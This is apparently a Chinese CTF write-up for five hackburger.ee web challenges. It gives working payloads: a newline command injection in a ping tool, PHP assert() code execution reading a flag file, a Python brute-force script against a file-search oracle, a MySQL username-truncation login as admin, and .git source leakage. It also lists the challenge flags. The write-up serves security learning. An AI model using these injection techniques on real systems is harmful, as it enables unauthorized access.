---
title: 2017 hackburger.ee 部分题 WriteUp
tags:
  - mysql字符截断
  - php
  - python
  - RCE
  - 命令执行
  - 源码泄露
  - WriteUp
date: 2017-07-28 16:13:54
---


hackburger.ee一共只有10道题，但是都非常有意思，花了些时间做出了5道，这里记录一下，后续做出来的也会更新上来
<!-- more -->

## Warmup
A ping utility, to ping stuff, you know
```
http://burger.laboratorium.ee:8000/
```
命令执行漏洞，%0a换行后就可以执行任意命令
```
http://burger.laboratorium.ee:8000/?host=127.0.0.1%0als
```
然后cat flag.php即可拿到flag
```
The flag is f1b35744925a3f5946c542a1ee64267af8b93b06
```

## File search
Here you can search files
```
http://burger.laboratorium.ee:8004/
```
fuzz中发现这题的搜索框会搜索到文件名或内容包含该字符串的文件，很多人用burp手动跑，我就用py写了个小脚本
```python
#!/usr/bin/python
#-*- coding: utf-8 -*-
#by:CodeMonster
import requests
import re

r=requests.session()
str="abcdefhijklmnopqrstuvwxyz1234567890_g"
ls=len(str)
url="http://burger.laboratorium.ee:8004/"
flag=""

def postq(s1):
    data={"query":s1}
    r1=r.post(url=url,data=data)
    return len(re.findall( r'flag.txt', r1.text))

def fun1(s):
    for i in str:
        flag=s+i
        print flag
        if postq(flag)==1:
            print flag
            flag=fun1(flag)
            break
    return flag

def fun2(s):
    for i in str:
        flag=i+s
        print flag
        if postq(flag)==1:
            print flag
            flag=fun2(flag)
            break
    return flag

print fun2(fun1(flag)[0:-1])[1:]
```
这里把g字符放到了后面，因为怕匹配出flag字符串，最后flag为
```
t_h_e__f_l_a_g__i_s__c82584c307421228a3c5c5e4dc6a3ea31859975e
```

## Number to ASCII converter
A tool to convert numbers to ASCII characters
```
http://burger.laboratorium.ee:8001/
```
题目给了源代码，很容易看出`assert($_GET['number'], "Number is zero");`这里存在`命令执行漏洞`
构造
```
http://burger.laboratorium.ee:8001/?number=eval(system("cat where/is/the/flag/i/am/looking/for/flag.php"))
```
读取flag
```
The flag is adb92727cb7edc1802eb4616d23aef3ffaa928a4
```

## That's not how you write signup
A login form and a registration form. With some problems (but not SQL injection, SQLi is boring).
```
http://burger.laboratorium.ee:8002/
```
题目给了登录和注册功能，源代码也给了，提示不是注入，又需要admin登录，就想到一个姿势，mysql字符截断漏洞,因为没有限制用户名长度，就可以注册一个用户名为`admin                         (...很多空格...)111`的用户，然后就可以登录admin账号

```
Flag is ad0f46b77ae29d84a5f2b3a9b0784853d2aee093
```

## Magic

The description left out intentionally. Flag3 is currently unavailable, enter 0 instead.
```
http://burger.laboratorium.ee:8006/
```
考察的是扫描器？？robots.txt有个flag，index.php~有个flag，.git泄露，用githack爬下来index.php里面有个flag，拼接起来就是最后的flag
```
47b9664515420d44d2c77dc593f7514ccbd17be8_392d28473a135c2491c227f373d0eed0310e13e3_0_ebb696a5abb04c8875a0afa29f6dc8d167db67e8
```